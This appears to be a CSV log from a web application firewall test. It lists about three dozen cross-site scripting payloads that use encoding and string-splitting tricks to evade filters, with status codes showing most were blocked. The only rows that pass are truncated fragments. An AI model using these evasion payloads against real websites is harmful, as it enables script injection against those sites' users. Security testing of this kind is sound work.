id,payload,status,response_size,blocked
0,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
1,<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x7,403,146,True
2,"<details ontoggle=""top['al'+'ert']`1`""><summary>x</summary>",403,146,True
3,<,200,1523,False
4,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
5,<iframe srcdoc='&lt;,403,146,True
6,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
7,<iframe srcdoc='&#60;&#107;&#97;&#110;&#114;&#111;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#60;&#121;&#114;&#118;&#101;&#114;&#116;&#62;'></iframe>,403,146,True
8,"<iframe srcdoc=""&lt;script&gt;parent[&#x27;al&#x27;+&#x27;ert&#x27;+&#x27;](1)&lt;/script&gt;"">",403,146,True
9,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
10,"<iframe srcdoc=""<script>parent[‘al'+’ert’](1)</script>"">",403,146,True
11,<details ontoggle=,403,146,True
12,<details open ontoggle=top['al'+,403,146,True
13,<details ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
14,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
15,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
16,<iframe srcdoc='<svg onload=eval(atob`YWxlcnQoMSk`)>'>,403,146,True
17,<details onto,200,1523,False
18,<details ontoggle=,403,146,True
19,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
20,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
21,<iframe srcdoc='<script>parent[&#x27;al&#x27;+&#x27;ert&#x27;](1)</script>'>,403,146,True
22,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
23,<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x7,403,146,True
24,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
25,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
26,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
27,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
28,<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x7,403,146,True
29,<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x7,403,146,True
30,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
31,"<iframe srcdoc=""&lt;script&gt;parent[&#x61;&#x6c;&#x65;&#x72;&#x74;](1)&lt;/script&gt;"">",403,146,True
32,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
33,<details ontoggle=top['al'+'ert']`1` open>,403,146,True
34,<iframe srcdoc='<script>parent[\'alert\'](1)</script>'>,403,146,True
35,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
